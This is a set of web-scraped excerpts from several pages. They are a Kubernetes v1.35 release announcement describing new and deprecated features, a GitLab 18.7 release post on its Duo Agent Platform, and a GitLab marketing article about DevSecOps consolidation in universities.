times and resource utilization for long-running workloads, without altering the broader lifecycle logic of their Pods.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5307\">KEP #5307</a> led by SIG Node.</p>\n<h3 id=\"csi-driver-opt-in-for-service-account-tokens-via-secrets-field\">CSI driver opt-in for service account tokens via secrets field</h3>\n<p>Providing ServiceAccount tokens to Container Storage Interface (CSI) drivers has traditionally relied on injecting them into the <code>volume_context</code> field. This approach presents a significant security risk because <code>volume_context</code> is intended for non-sensitive configuration data and is frequently logged in plain text by drivers and debugging tools, potentially leaking credentials.</p>\n<p>Kubernetes v1.35 introduces an opt-in mechanism for CSI drivers to receive ServiceAccount tokens via the dedicated secrets field in the NodePublishVolume request. Drivers can now enable this behavior by setting the <code>serviceAccountTokenInSecrets</code> field to true in their CSIDriver object, instructing the <code>kubelet</code> to populate the token securely.</p>\n<p>The primary benefit is the prevention of accidental credential exposure in logs and error messages. This change ensures that sensitive workload identities are handled via the appropriate secure channels, aligning with best practices for secret management while maintaining backward compatibility for existing drivers.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5538\">KEP #5538</a> led by SIG Auth in cooperation with SIG Storage.</p>\n<h3 id=\"deployment-status-count-of-terminating-replicas\">Deployment status: count of terminating replicas</h3>\n<p>Historically, the Deployment status provided details on available and updated replicas but lacked explicit visibility into Pods that were in the process of shutting down. A drawback of this omission was that users and controllers could not easily distinguish between a stable Deployment and one that still had Pods executing cleanup tasks or adhering to long grace periods.</p>\n<p>Kubernetes v1.35 promotes the <code>terminatingReplicas</code> field within the Deployment status to beta. This field provides a count of Pods that have a deletion timestamp set but have not yet been removed from the system. This feature is a foundational step in a larger initiative to improve how Deployments handle Pod replacement, laying the groundwork for future policies regarding when to create new Pods during a rollout.</p>\n<p>The primary benefit is improved observability for lifecycle management tools and operators. By exposing the number of terminating Pods, external systems can now make more informed decisions such as waiting for a complete shutdown before proceeding with subsequent tasks without needing to manually query and filter individual Pod lists.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/3973\">KEP #3973</a> led by SIG Apps.</p>\n<h2 id=\"new-features-in-alpha\">New features in Alpha</h2>\n<p><em>This is a selection of some of the improvements that are now alpha following the v1.35 release.</em></p>\n<h3 id=\"gang-scheduling-support-in-kubernetes\">Gang scheduling support in Kubernetes</h3>\n<p>Scheduling interdependent workloads, such as AI/ML training jobs or HPC simulations, has traditionally been challenging because the default Kubernetes scheduler places Pods individually. This often leads to partial scheduling where some Pods start while others wait indefinitely for resources, resulting in deadlocks and wasted cluster capacity.</p>\n<p>Kubernetes v1.35 introduces native support for so-called &quot;gang scheduling&quot; via the new Workload API and PodGroup concept. This feature implements an &quot;all-or-nothing&quot; scheduling strategy, ensuring that a defined group of Pods is scheduled only if the cluster has sufficient resources to accommodate the entire group simultaneously.</p>\n<p>The primary benefit is improved reliability and efficiency for batch and parallel workloads. By preventing partial deployments, it eliminates resource deadlocks and ensures that expensive cluster capacity is utilized only when a complete job can run, significantly optimizing the orchestration of large-scale data processing tasks.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4671\">KEP #4671</a> led by SIG Scheduling.</p>\n<h3 id=\"constrained-impersonation\">Constrained impersonation</h3>\n<p>Historically, the <code>impersonate</code> verb in Kubernetes RBAC functioned on an all-or-nothing basis: once a user was authorized to impersonate a target identity, they gained all associated permissions. A drawback of this broad authorization was that it violated the principle of least privilege, preventing administrators from restricting impersonators to specific actions or resources.</p>\n<p>Kubernetes v1.35 introduces a new alpha feature, constrained impersonation, which adds a secondary authorization check to the impersonation flow. When enabled via the <code>ConstrainedImpersonation</code> feature gate, the API server verifies not only the basic <code>impersonate</code> permission but also checks if the impersonator is authorized for the specific action using new verb prefixes (e.g., <code>impersonate-on:&lt;mode&gt;:&lt;verb&gt;</code>). This allows administrators to define fine-grained policies—such as permitting a support engineer to impersonate a cluster admin solely to view logs, without granting full administrative access.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5284\">KEP #5284</a> led by SIG Auth.</p>\n<h3 id=\"flagz-for-kubernetes-components\">Flagz for Kubernetes components</h3>\n<p>Verifying the runtime configuration of Kubernetes components, such as the API server or <code>kubelet</code>, has traditionally required privileged access to the host node or process arguments. To address this, the <code>/flagz</code> endpoint was introduced to expose command-line options via HTTP. However, its output was initially limited to plain text, making it difficult for automated tools to parse and validate configurations reliably.</p>\n<p>In Kubernetes v1.35, the <code>/flagz</code> endpoint has been enhanced to support structured, machine-readable JSON output. Authorized users can now request a versioned JSON response using standard HTTP content negotiation, while the original plain text format remains available for human inspection. This update significantly improves observability and compliance workflows, allowing external systems to programmatically audit component configurations without fragile text parsing or direct infrastructure access.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4828\">KEP #4828</a> led by SIG Instrumentation.</p>\n<h3 id=\"statusz-for-kubernetes-components\">Statusz for Kubernetes components</h3>\n<p>Troubleshooting Kubernetes components like the <code>kube-apiserver</code> or <code>kubelet</code> has traditionally involved parsing unstructured logs or text output, which is brittle and difficult to automate. While a basic <code>/statusz</code> endpoint existed previously, it lacked a standardized, machine-readable format, limiting its utility for external monitoring systems.</p>\n<p>In Kubernetes v1.35, the <code>/statusz</code> endpoint has been enhanced to support structured, machine-readable JSON output. Authorized users can now request this format using standard HTTP content negotiation to retrieve precise status data—such as version information and health indicators—without relying on fragile text parsing. This improvement provides a reliable, consistent interface for automated debugging and observability tools across all core components.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/4827\">KEP #4827</a> led by SIG Instrumentation.</p>\n<h3 id=\"ccm-watch-based-route-controller-reconciliation-using-informers\">CCM: watch-based route controller reconciliation using informers</h3>\n<p>Managing network routes within cloud environments has traditionally relied on the Cloud Controller Manager (CCM) periodically polling the cloud provider's API to verify and update route tables. This fixed-interval reconciliation approach can be inefficient, often generating a high volume of unnecessary API calls and introducing latency between a node state change and the corresponding route update.</p>\n<p>For the Kubernetes v1.35 release, the cloud-controller-manager library introduces a watch-based reconciliation strategy for the route controller. Instead of relying on a timer, the controller now utilizes informers to watch for specific Node events, such as additions, deletions, or relevant field updates and triggers route synchronization only when a change actually occurs.</p>\n<p>The primary benefit is a significant reduction in cloud provider API usage, which lowers the risk of hitting rate limits and reduces operational overhead. Additionally, this event-driven model improves the responsiveness of the cluster's networking layer by ensuring that route tables are updated immediately following changes in cluster topology.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5237\">KEP #5237</a> led by SIG Cloud Provider.</p>\n<h3 id=\"extended-toleration-operators-for-threshold-based-placement\">Extended toleration operators for threshold-based placement</h3>\n<p>Kubernetes v1.35 introduces SLA-aware scheduling by enabling workloads to express reliability requirements. The feature adds numeric comparison operators to tolerations, allowing pods to match or avoid nodes based on SLA-oriented taints such as service guarantees or fault-domain quality.</p>\n<p>The primary benefit is enhancing the scheduler with more precise placement. Critical workloads can demand higher-SLA nodes, while lower priority workloads can opt into lower SLA ones. This improves utilization and reduces cost without compromising reliability.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5471\">KEP #5471</a> led by SIG Scheduling.</p>\n<h3 id=\"mutable-container-resources-when-job-is-suspended\">Mutable container resources when Job is suspended</h3>\n<p>Running batch workloads often involves trial and error with resource limits. Currently, the Job specification is immutable, meaning that if a Job fails due to an Out of Memory (OOM) error or insufficient CPU, the user cannot simply adjust the resources; they must delete the Job and create a new one, losing the execution history and status.</p>\n<p>Kubernetes v1.35 introduces the capability to update resource requests and limits for Jobs that are in a suspended state. Enabled via the <code>MutableJobPodResourcesForSuspendedJobs</code> feature gate, this enhancement allows users to pause a failing Job, modify its Pod template with appropriate resource values, and then resume execution with the corrected configuration.</p>\n<p>The primary benefit is a smoother recovery workflow for misconfigured jobs. By allowing in-place corrections during suspension, users can resolve resource bottlenecks without disrupting the Job's lifecycle identity or losing track of its completion status, significantly improving the developer experience for batch processing.</p>\n<p>This work was done as part of <a href=\"https://kep.k8s.io/5440\">KEP #5440</a> led by SIG Apps.</p>\n<h2 id=\"other-notable-changes\">Other notable changes</h2>\n<h3 id=\"continued-innovation-in-dynamic-resource-allocation-dra\">Continued innovation in Dynamic Resource Allocation (DRA)</h3>\n<p>The <a href=\"https://kep.k8s.io/4381\">core functionality</a> was graduated to stable in v1.34, with the ability to turn it off.

Clients could also provide a resource version to the API server and ask the control plane to do internal comparisons, such as streaming all events since a particular resource version.</p>\n<p>In v1.35, all in-tree resource versions meet a new stricter definition: the values are a special form of decimal number. And, because they can be compared, clients can do their own operations to compare two different resource versions.\nFor example, this means that a client reconnecting after a crash can detect when it has lost updates, as distinct from the case where there has been an update but no lost changes in the meantime.</p>\n<p>This change in semantics enables other important use cases such as <a href=\"https://kubernetes.io/docs/tasks/manage-kubernetes-objects/storage-version-migration/\">storage version migration</a>, performance improvements to <em>informers</em> (a client helper concept), and controller reliability.

Kubernetes v1.35 includes a couple of deprecations.</p>\n<h4 id=\"ingress-nginx-retirement\">Ingress NGINX retirement</h4>\n<p>For years, the Ingress NGINX controller has been a popular choice for routing traffic into Kubernetes clusters. It was flexible, widely adopted, and served as the standard entry point for countless applications.</p>\n<p>However, maintaining the project has become unsustainable. With a severe shortage of maintainers and mounting technical debt, the community recently made the difficult decision to retire it. This isn't strictly part of the v1.35 release, but it's such an important change that we wanted to highlight it here.</p>\n<p>Consequently, the Kubernetes project announced that Ingress NGINX will receive only best-effort maintenance until <strong>March 2026</strong>. After this date, it will be archived with no further updates. The recommended path forward is to migrate to the <a href=\"https://gateway-api.sigs.k8s.io/\">Gateway API</a>, which offers a more modern, secure, and extensible standard for traffic management.</p>\n<p>You can find more in the <a href=\"https://kubernetes.io/blog/2025/11/11/ingress-nginx-retirement/\">official blog post</a>.</p>\n<h4 id=\"removal-of-cgroup-v1-support\">Removal of cgroup v1 support</h4>\n<p>When it comes to managing resources on Linux nodes, Kubernetes has historically relied on cgroups (control groups). While the original cgroup v1 was functional, it was often inconsistent and limited. That is why Kubernetes introduced support for cgroup v2 back in v1.25, offering a much cleaner, unified hierarchy and better resource isolation.</p>\n<p>Because cgroup v2 is now the modern standard, Kubernetes is ready to retire the legacy cgroup v1 support in v1.35. This is an important notice for cluster administrators: if you are still running nodes on older Linux distributions that don't support cgroup v2, your <code>kubelet</code> will fail to start. To avoid downtime, you will need to migrate those nodes to systems where cgroup v2 is enabled.</p>\n<p>To learn more, read <a href=\"https://kubernetes.io/docs/concepts/architecture/cgroups/\">about cgroup v2</a>;<br />\nyou can also track the switchover work via <a href=\"https://kep.k8s.io/5573\">KEP-5573: Remove cgroup v1 support</a>.</p>\n<h4 id=\"deprecation-of-ipvs-mode-in-kube-proxy\">Deprecation of ipvs mode in kube-proxy</h4>\n<p>Years ago, Kubernetes adopted the <a href=\"https://kubernetes.io/docs/reference/networking/virtual-ips/#proxy-mode-ipvs\"><code>ipvs</code></a> mode in <code>kube-proxy</code> to provide faster load balancing than the standard <a href=\"https://kubernetes.io/docs/reference/networking/virtual-ips/#proxy-mode-iptables\"><code>iptables</code></a>. While it offered a performance boost, keeping it in sync with evolving networking requirements created too much technical debt and complexity.</p>\n<p>Because of this maintenance burden, Kubernetes v1.35 deprecates <code>ipvs</code> mode. Although the mode remains available in this release, <code>kube-proxy</code> will now emit a warning on startup when configured to use it. The goal is to streamline the codebase and focus on modern standards. For Linux nodes, you should begin transitioning to <a href=\"https://kubernetes.io/docs/reference/networking/virtual-ips/#proxy-mode-nftables\"><code>nftables</code></a>, which is now the recommended replacement.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/5495\">KEP-5495: Deprecate ipvs mode in kube-proxy</a>.</p>\n<h4 id=\"final-call-for-containerd-v1-x\">Final call for containerd v1.X</h4>\n<p>While Kubernetes v1.35 still supports containerd 1.7 and other LTS releases, this is the final version with such support. The SIG Node community has designated v1.35 as the last release to support the containerd v1.X series.</p>\n<p>This serves as an important reminder: before upgrading to the next Kubernetes version, you must switch to containerd 2.0 or later. To help identify which nodes need attention, you can monitor the <code>kubelet_cri_losing_support</code> metric within your cluster.</p>\n<p>You can find more in the <a href=\"https://kubernetes.io/blog/2025/09/12/kubernetes-v1-34-cri-cgroup-driver-lookup-now-ga/#announcement-kubernetes-is-deprecating-containerd-v1-y-support\">official blog post</a> or in <a href=\"https://kep.k8s.io/4033\">KEP-4033: Discover cgroup driver from CRI</a>.</p>\n<h4 id=\"improved-pod-stability-during-kubelet-restarts\">Improved Pod stability during <code>kubelet</code> restarts</h4>\n<p>Previously, restarting the <code>kubelet</code> service often caused a temporary disruption in Pod status. During a restart, the kubelet would reset container states, causing healthy Pods to be marked as <code>NotReady</code> and removed from load balancers, even if the application itself was still running correctly.</p>\n<p>To address this reliability issue, this behavior has been corrected to ensure seamless node maintenance. The <code>kubelet</code> now properly restores the state of existing containers from the runtime upon startup. This ensures that your workloads remain <code>Ready</code> and traffic continues to flow uninterrupted during <code>kubelet</code> restarts or upgrades.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/4781\">KEP-4781: Fix inconsistent container ready state after kubelet restart</a>.</p>\n<h2 id=\"release-notes\">Release notes</h2>\n<p>Check out the full details of the Kubernetes v1.35 release in our <a href=\"https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.35.md\">release notes</a>.</p>\n<h2 id=\"availability\">Availability</h2>\n<p>Kubernetes v1.35 is available for download on <a href=\"https://github.com/kubernetes/kubernetes/releases/tag/v1.35.0\">GitHub</a> or on the <a href=\"https://kubernetes.io/releases/download/\">Kubernetes download page</a>.</p>\n<p>To get started with Kubernetes, check out these <a href=\"https://kubernetes.io/docs/tutorials/\">interactive tutorials</a> or run local Kubernetes clusters using <a href=\"https://minikube.sigs.k8s.io/\">minikube</a>.

Each release team is made up of dedicated community volunteers who work together to build the many pieces that make up the Kubernetes releases you rely on. This requires the specialized skills of people from all corners of our community, from the code itself to its documentation and project management.</p>\n<p><a href=\"https://github.com/cncf/memorials/blob/main/han-kang.md\">We honor the memory of Han Kang</a>, a long-time contributor and respected engineer whose technical excellence and infectious enthusiasm left a lasting impact on the Kubernetes community. Han was a significant force within SIG Instrumentation and SIG API Machinery, earning a <a href=\"https://www.kubernetes.dev/community/awards/2021/\">2021 Kubernetes Contributor Award</a> for his critical work and sustained commitment to the project's core stability. Beyond his technical contributions, Han was deeply admired for his generosity as a mentor and his passion for building connections among people. He was known for &quot;opening doors&quot; for others, whether guiding new contributors through their first pull requests or supporting colleagues with patience and kindness. Han’s legacy lives on through the engineers he inspired, the robust systems he helped build, and the warm, collaborative spirit he fostered within the cloud native ecosystem.</p>\n<p>We would like to thank the entire <a href=\"https://github.com/kubernetes/sig-release/blob/master/releases/release-1.35/release-team.md\">Release Team</a> for the hours spent hard at work to deliver the Kubernetes v1.35 release to our community.

With foundational agents, custom agents, and automated flows working together inside GitLab, teams will be able to adopt agentic workflows that help accelerate work while staying aligned to organizational standards. At GA, we also plan to include expanded AI Catalog functionality, stronger administrative controls, reliability enhancements, and a flexible usage-based billing model designed to provide flexibility for agentic AI usage across many roles and projects.</p><p>The <a href=\"https://about.gitlab.com/releases/2025/12/18/gitlab-18-7-released/\" rel=\"\">18.7 release</a> adds important building blocks to support GitLab Duo Agent Platform’s upcoming GA. New automation features, stronger governance controls, and enhancements across security and pipeline authoring help teams streamline their work and lay the groundwork for an even more reliable agentic experience in 18.8 and beyond.</p><blockquote><p>On February 10, 2026, we will host <a href=\"https://about.gitlab.com/events/transcend/virtual/\" rel=\"\">a global event</a> that brings our vision of GitLab as the intelligent orchestration platform to life, where software teams and their AI agents stay in flow. You will hear how customers are tackling the <a href=\"https://about.gitlab.com/developer-survey/\" rel=\"\">AI paradox in software delivery</a>, see intelligent orchestration in action across DevSecOps workflows, and get a jump start on what this next chapter means for your own modernization journey. <a href=\"https://about.gitlab.com/transcend/virtual/\" rel=\"\">Reserve your spot</a> to see how GitLab’s next chapter comes together.</p></blockquote><p><strong>Here's what is new in 18.7:</strong></p><h2 id=\"gitlab-duo-agent-platform\">GitLab Duo Agent Platform</h2><p>As more teams bring AI into their development and security workflows, GitLab continues to focus on making adoption powerful and predictable. The updates in 18.7 strengthen the foundation for guided, governed AI experiences that will become fully realized when GitLab Duo Agent Platform reaches GA, as planned for 18.8.</p><p><a href=\"https://docs.gitlab.com/user/duo_agent_platform/flows/custom/\" rel=\"\"><strong>Custom Flows</strong></a></p><p>Custom Flows introduce a new way for teams to automate multistep workflows using YAML-defined sequences that orchestrate agents to complete repetitive development tasks. Custom Flows help eliminate manual effort for scenarios that follow predictable patterns — such as diagnosing and fixing failed pipelines, updating dependencies, or running policy checks when reviewers are assigned. Instead of handling these tasks interactively, teams can define flows that automatically trigger from GitLab events like mentions and assignments. This capability supports developers who want tailored automations for their own projects, as well as administrators who need consistent, organization-wide workflows for compliance and operational efficiency.</p><p><a href=\"https://docs.gitlab.com/user/duo_agent_platform/flows/foundational_flows/sast_false_positive_detection/\" rel=\"\"><strong>SAST False Positive Detection Flow</strong></a></p><p>AI-powered false positive management for Static Application Security Testing (SAST) works to introduce a faster, more accurate way for teams to assess and act on potential false positives. GitLab now uses AI to help identify which findings may be false positives earlier in the review process, reducing the time developers and security teams spend triaging noise. Users can see an overview of how many vulnerabilities may warrant review, track their analysis progress, and dismiss false positives directly from the vulnerability report. Once dismissed, these findings stay dismissed across future pipelines and continue to reflect the correct dismissed status in merge request widgets. This assists with a consistent and reliable signal as code evolves and helps teams focus on real risks, streamline remediation, and cut down on unnecessary security review cycles.</p><p><a href=\"https://docs.gitlab.com/user/duo_agent_platform/ai_catalog/#agent-and-flow-versions\" rel=\"\"><strong>Custom Agent Versioning</strong></a></p><p>Custom Agent Versioning gives teams control over which version of an AI Catalog agent or flow they use in their projects. Instead of automatically inheriting updates from the creator, GitLab now pins each project to the exact version of the agent and flow enabled for the team. This helps prevent breaking changes, security risks, and workflow disruptions, especially in production pipelines or security-sensitive environments. Teams can upgrade when they choose, test new versions in staging before promoting them, and clearly see which version is running to avoid confusion. It also enables safer customization by letting users fork an agent at a specific version and evolve it independently. The result is a more predictable, stable, and secure way to adopt custom agents across development and CI/CD workflows.</p><p><a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/#turn-foundational-agents-on-or-off\" rel=\"\"><strong>New Settings for Foundational Agents</strong></a></p><p>Admins now have the ability to turn <a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/\" rel=\"\">foundational agents</a> on or off, giving teams greater control over how AI is used across their organization. With this update, admins can enable or disable these agents at the instance or group level, choose default availability, and control how new agents are introduced while still providing access to the core agent. The result is more flexible AI adoption with the governance, consistency, and control enterprise teams need.</p><p><a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/data_analyst/\" rel=\"\"><strong>Data Analyst Agent</strong></a></p><p>The Data Analyst Agent gives teams a simple way to explore GitLab data using natural language, automatically generating <a href=\"https://docs.gitlab.com/user/glql/\" rel=\"\">GitLab Query Language</a> (GLQL)  queries, retrieving relevant information, and presenting clear insights without requiring dashboards or manual query writing. Users can analyze work volume, understand team activity, identify development trends, monitor issue and merge request status, and quickly discover work items by labels, authors, milestones, or other criteria. It also creates reusable GLQL queries that can be embedded anywhere GitLab Flavored Markdown is supported, making it easier to share findings and answer everyday questions about project activity directly within GitLab.</p><h2 id=\"core-devops\">Core DevOps</h2><p>Innovations with GitLab Duo Agent Platform are most effective when the underlying DevOps experience is equally streamlined and dependable. The improvements in 18.7 to core GitLab workflows help ensure that automation, pipelines, and reusable components operate with highest levels of clarity and consistency.</p><p><a href=\"https://docs.gitlab.com/ci/inputs/#define-conditional-input-options-with-specinputsrules\" rel=\"\"><strong>Dynamic Input Selection in GitLab Pipelines</strong></a></p><p>Dynamic Input Selection in GitLab Pipelines introduces a more intuitive way to trigger pipelines through dynamic, cascading dropdown fields in the GitLab UI. This allows cross-functional teams to run pipelines without editing YAML or relying on developers, while ensuring that only valid, context-aware options are shown as they make selections. The feature supports complex workflows, assists with reducing misconfigured runs, and removes a key blocker for teams migrating from Jenkins Active Choice, helping organizations standardize their CI/CD processes entirely on GitLab.</p><p><a href=\"https://docs.gitlab.com/ee/ci/components/\" rel=\"\"><strong>CI/CD Catalog Publication Guardrails</strong></a></p><p>Administrators of GitLab Self-Managed and GitLab Dedicated can now control which projects are allowed to publish components to the CI/CD Catalog. This new setting helps organizations maintain a curated, trusted ecosystem by ensuring only approved sources can add components. It strengthens governance for enterprise customers who want to preserve control over their CI/CD landscape while still enabling teams to discover and reuse sanctioned components.</p><h2 id=\"platform-security\">Platform Security</h2><p>As automation and pipeline workflows become more efficient, it remains essential that teams maintain strong visibility and control over how code changes meet organizational standards. The Platform Security update in 18.7 reinforces this balance by giving teams a more flexible way to introduce and refine policy guidance without interrupting delivery.</p><p><a href=\"https://docs.gitlab.com/user/application_security/policies/merge_request_approval_policies/#warn-mode\" rel=\"\"><strong>Warn Mode for MR Approval Policies</strong></a></p><p>Warn Mode for MR Approval Policies allows violations to be surfaced without blocking merges, giving teams a lower-friction way to introduce or adjust policies while assessing their impact before full enforcement. It also supports a guidance-based approach, where developers can review or dismiss violations with all actions audited to help AppSec refine policy effectiveness. Beyond merge requests, violations already present or introduced into the default branch now appear with a visual badge in the <a href=\"https://docs.gitlab.com/user/application_security/vulnerability_report/\" rel=\"\">Vulnerability Report</a>, making it easier to identify and prioritize issues that break policy.</p><h2 id=\"elevating-how-teams-build-secure-and-deliver-software\">Elevating how teams build, secure, and deliver software</h2><p>The 18.7 release is about strengthening the foundation for reliable, flexible automation across your GitLab environment.</p><p>GitLab Premium and Ultimate users can start using these capabilities today on <a href=\"https://GitLab.com\" rel=\"\">GitLab.com</a> and self-managed environments, with availability for GitLab Dedicated customers planned for next month.</p><p>GitLab Duo Agent Platform is currently in <strong>beta</strong> — enable beta and experimental features to experience how full-context AI can transform the way your teams build software.

      "summary": "<p>When Dr. James Quilty began developing engineering project management courses at Victoria University of Wellington's School of Engineering and Computer Science, he didn't find an organized system for delivering course content. Instead, he was faced with chaos.</p><p>The problem was that back in 2015 learning materials were scattered across a dozen different tools, like the Blackboard platform, customized Wiki pages, personal websites, and shared Google Docs. On top of that, students were left to choose their own tools for coursework. All of this led to a constant state of confusion. As if that weren’t enough, few of these disparate systems provided proper version history or reliable issue tracking.</p><p>This all-too-familiar lack of standardization was creating massive headaches for both lecturers and students.</p><p>&quot;Information was fragmented across multiple files, multiple formats — sitting often on file systems, not necessarily under good version control,&quot; says Quilty, who is now program director for engineering at the New Zealand university.</p><p>After consolidating on GitLab Self-Managed Ultimate in 2017, <a href=\"https://about.gitlab.com/customers/victoria-university/\" rel=\"\">Victoria University</a> saw 483% growth in student users by 2021. They also added 35 GitLab-enabled courses and now host more than 8,000 projects. The university also deployed GitLab as a unified DevSecOps platform for academic coursework, replacing what had become a fragmented and complicated toolchain. More importantly, they've redirected faculty time from administration to actual education.</p><p>This pattern isn't unique. Across higher education, IT teams struggle with the same tool sprawl — multiple tools and incompatible systems that lead to hours lost to context switching and administering disparate and costly tools. Simplifying how teams build and deliver software is the answer to this widespread problem.</p><p>The teams making real progress are reducing complexity instead of creating it.</p><h3 id=\"facing-the-complexity-problem\">Facing the complexity problem</h3><p>Higher education IT teams are faced with managing aging infrastructure, legacy systems, and resource constraints that force difficult tradeoffs with every technology decision they have to make.</p><p>Development workflows exist in silos since many departments use different version control systems, CI/CD tools, and security scanners. That means teams struggle to collaborate on cross-functional projects because they're working with incompatible toolchains and a lack of shared visibility.</p><p>Legacy technology compounds these problems. Many institutions run development environments that are outdated and incompatible with modern DevSecOps practices. But replacing them isn't realistic when budgets are tight and IT staff are already stretched thin.</p><p>To take on these problems, institutions need to modernize, but because of administrative processes, budget constraints, and the reality of managing critical systems, they have to do it in phases, not overnight. For instance, some workloads may move to the cloud while others remain on-premises. <a href=\"https://edtechmagazine.com/higher/article/2024/09/how-approach-higher-eds-hybrid-cloud-migration\" rel=\"\">A research department</a>, for instance, might shift large datasets off-site while central IT functions stay in-house.</p><p>Organizations need the flexibility to be able to do that, and that’s what they get with GitLab Ultimate, the enterprise-ready DevSecOps platform that delivers the same capabilities whether you deploy on GitLab.com or self-host on your own infrastructure: on-premises servers, data centers, or cloud providers, including AWS, GCP, Azure, or even multi-cloud. Self-hosted deployments include all features, including air-gapped support for sensitive environments.</p><p>This means, with <a href=\"https://about.gitlab.com/pricing/ultimate/\" rel=\"\">GitLab Ultimate</a>, institutions can modernize on their own timeline without abandoning governance requirements or forcing wholesale infrastructure changes.</p><h3 id=\"moving-from-manual-compliance-to-automated-enforcement\">Moving from manual compliance to automated enforcement</h3><p>IT teams also have to work with regulatory mandates and that adds another layer of complexity. Student privacy requirements, research grant stipulations, and institutional security policies all demand audit trails and governance controls. For institutions supporting U.S. Department of Defense research or contractors, <a href=\"https://www.meritalk.com/articles/dod-begins-rollout-of-cmmc-on-nov-10-heres-what-you-need-to-know/\" rel=\"\">CMMC 2.0 compliance requirements</a> add stringent cybersecurity controls based on NIST SP 800-171. Meeting these obligations while modernizing traditionally meant manually documenting everything — a process that didn't scale easily.</p><p>In conversations with team members from educational institutions at events like EDUCAUSE we've learned it's all too common for dedicated compliance staff to spend the majority of their time gathering evidence for audits, instead of actually improving security. Not building better software. Just proving that policies were followed. This administrative burden extends to development teams, as well. According to Forrester Consulting’s study <a href=\"https://about.gitlab.com/resources/study-forrester-tei-gitlab-ultimate/variant/\" rel=\"\">The Total Economic Impact™ of GitLab Ultimate</a>, which was commissioned by GitLab, software development team members save 90% of the time previously spent on annual auditing and compliance efforts after adopting GitLab's end-to-end platform.</p><p>GitLab saves all of that time and effort by enabling automation through <a href=\"https://docs.gitlab.com/user/compliance/compliance_frameworks/\" rel=\"\">custom compliance frameworks</a> that map multiple, overlapping controls from different standards and regulations into a single, unified structure. They then cascade automatically from the instance level to all subgroups and projects, ensuring consistent enforcement without manual configuration.</p><p><a href=\"https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/\" rel=\"\">Pipeline execution policies</a> enforce compliance directly in CI/CD pipelines where development work happens. Rather than operating disparate governance, risk, and compliance tools, compliance validation occurs automatically as code moves through the pipeline. To make all of this easier, GitLab’s <a href=\"https://docs.gitlab.com/user/compliance/compliance_center/\" rel=\"\">Compliance Center</a> provides oversight through dashboards that show where projects fail to meet framework requirements — whether due to failed security scans or other control gaps.</p><p>Complete <a href=\"https://docs.gitlab.com/user/compliance/audit_events/\" rel=\"\">audit trails</a> also capture every code change with timestamps and attribution. And <a href=\"https://handbook.gitlab.com/handbook/security/security-assurance/security-compliance/policy-as-code/\" rel=\"\">policy-as-code</a> enforces security rules that can't be bypassed. When an auditor asks who changed what code and when, you have the answer instantly — without weeks spent manually gathering evidence. Every pipeline execution automatically generates compliance documentation, enabling teams to instantly prove adherence to requirements and quickly identify any control gaps.</p><h3 id=\"ai-governance-over-guesswork\">AI: Governance over guesswork</h3><p>This visibility across the entire security posture matters now more than ever. Artificial intelligence (AI) is changing how software gets built with many teams testing AI code generation tools to enable them to move faster. But higher education institutions are uniquely positioned to lead on a critical question: How do you adopt AI responsibly?</p><p><a href=\"https://edtechmagazine.com/higher/article/2025/10/ai-playbook-comprehensive-strategy-higher-education-perfcon\" rel=\"\">Cornell University</a> and <a href=\"https://www.fullerton.edu/it/ai/ethical-principles-ai-framework.html\" rel=\"\">Cal State Fullerton</a> already are developing ethical frameworks for AI use, asking essential questions about transparency, explainability, and bias. The <a href=\"https://edtechmagazine.com/higher/article/2025/05/effective-ai-requires-effective-data-governance\" rel=\"\">University of California San Diego</a> is adapting its existing data governance framework — originally built for analytics platforms — to secure its on-premises AI assistants, ensuring the same access controls and approval workflows that protect institutional data now extend to AI-driven tools. Educational institutions understand that AI adoption requires more than just enabling new tools — it requires proper oversight and protection.</p><p>The problem isn't AI itself. It's AI without guardrails integrated into development workflows. Most organizations haven't considered what secure AI development looks like — what governance is needed for AI-generated code, how to maintain visibility into what gets committed to repositories, or how to ensure the same rigor applies whether code comes from a human or AI.</p><p>This is exactly where platform-level AI integration becomes essential. <a href=\"https://docs.gitlab.com/user/duo_agent_platform/\" rel=\"\">GitLab Duo Agent Platform</a> goes beyond fragmented AI tools and coding assistants alone to provide an orchestration layer that integrates AI across the entire software development lifecycle.</p><p>AI agents handle planning, testing, security remediation, and deployment tasks, while working alongside developers rather than just generating code on command. When security scans identify vulnerabilities, for example, AI agents explain findings, assess risks, and prioritize issues to reduce noise and accelerate mean time to recovery (MTTR). This platform approach ensures AI accelerates development without compromising the security standards and governance controls institutions require.</p><p>The benefits extend beyond technical capabilities. Through GitLab's <a href=\"https://about.gitlab.com/ai-transparency-center/\" rel=\"\">AI Transparency Center</a>, institutions get clear documentation of data privacy protections, AI ethics principles, and vendor selection processes. This means schools can adopt AI tools while maintaining the governance standards they're developing institution-wide.</p><p>AI will change how we build software. The question is whether institutions can do it with the same responsible approach they're bringing to AI adoption across campus.</p><h2 id=\"see-results-in-your-education-environment\">See results in your education environment</h2><p>The universities making real progress aren't adding more tools to manage complexity. They're consolidating onto platforms that prevent problems rather than just detecting them, creating visibility and automation across their development workflows.</p><p>Forrester's <a href=\"https://about.gitlab.com/resources/study-forrester-tei-gitlab-ultimate/variant/\" rel=\"\">The Total Economic Impact™ of GitLab Ultimate</a> study found that a composite organization representative of interviewed customers reclaimed up to 305 hours per developer year through automated testing within a single interface, eliminating constant context switching between tools.

